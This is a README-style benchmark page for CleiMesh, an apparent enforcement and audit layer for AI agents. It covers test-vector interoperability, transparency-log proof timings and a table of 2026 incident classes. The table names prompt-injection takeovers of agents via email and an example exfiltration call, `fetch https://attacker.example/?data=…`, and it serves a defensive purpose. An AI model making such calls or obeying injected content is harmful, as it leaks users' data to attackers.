# CleiMesh — numbers

Measured facts, not marketing. Reproduce them yourself: the benchmark is a
runnable example, and the interoperability is a test suite.

## Interoperability (verified, not "inspired by")

CleiMesh does not invent its own token or receipt format — it implements the
IETF drafts, and proves it against their published vectors.

| Claim | How it is checked | Result |
|---|---|---|
| Receipts match `draft-sahu-agent-action-receipts` | Its Appendix A test vectors: canonical form, SHA‑256, and Ed25519 signatures | **reproduced byte for byte** |
| Token profile matches `draft-niyikiza-oauth-attenuating-agent-tokens` | RFC 8037 EdDSA (JWS) vectors + the draft's §4/§7 algorithm | **passes** |
| Transparency log matches RFC 6962 (Certificate Transparency / Sigstore) | External constants (empty tree = `SHA‑256("")`, leaf of `""` = `SHA‑256(0x00)`) + an independent from‑scratch Merkle Tree Hash | **matches** |

```
cargo test -p cleimesh-receipt   # receipt + transparency-log vectors
cargo test -p cleimesh-aat       # token profile + RFC 8037
```

## Transparency log: verify one receipt in a huge log

A third party verifies that one receipt is in the signed log — and that the log
only ever appended — with only the proof, never the rest of the log, and without
trusting the agent. The proof is `⌈log₂ N⌉` hashes.

Measured on a developer laptop, `--release`:

| Log size (N) | Inclusion proof | Verify one receipt |
|---:|---:|---:|
| 1,000 | 10 hashes (320 B) | 8.8 µs |
| 100,000 | 17 hashes (544 B) | 13.1 µs |
| **1,000,000** | **20 hashes (640 B)** | **12.6 µs** |

> A receipt in a **million**-entry log is proven with a **640-byte** proof in
> **~13 microseconds**, without the other 999,999 receipts.

Signing a receipt (Ed25519 over the canonical bytes): **~32 µs**, ~31,000/s.

```
cargo run --release -p cleimesh-receipt --example bench
```

## What it stops (runnable)

Each 2026 incident class, reduced to the tool call that does the damage, and the
CleiMesh rule that refuses it. Honest scope: CleiMesh does not fix the injection,
the SSRF or the rendering race — it gates the **action** the attack needs.

| Incident class (2026) | The damaging tool call | CleiMesh refuses it by | Demo |
|---|---|---|---|
| Over-authorized spend | `pay` past the cap / wrong payee | signed allowance (cap, payee, count) | `--example payments` |
| One-email agent takeover (Manus) | `send` / `fetch` after reading injected mail | taint follows the delegation chain | `--example taint` |
| Exfiltration by fetch (Copilot flaws) | `fetch https://attacker.example/?data=…` | `host_in` egress allowlist (at the gateway) | `--example egress` |
| Over-permissioned handoff | a sub-agent acting beyond its grant | attenuating token — narrows only | `--example payments` / `taint` |

```
cargo run -p cleimesh-cli --example payments
cargo run -p cleimesh-cli --example taint
cargo run -p cleimesh-cli --example egress
```

## Caveats

- Figures are from one machine and a `--release` build; the command above
  reproduces them on yours.
- These numbers are about the enforcement and audit layer. CleiMesh is alpha;
  what it protects and what it does not are in [the threat model](docs/threat-model.md).
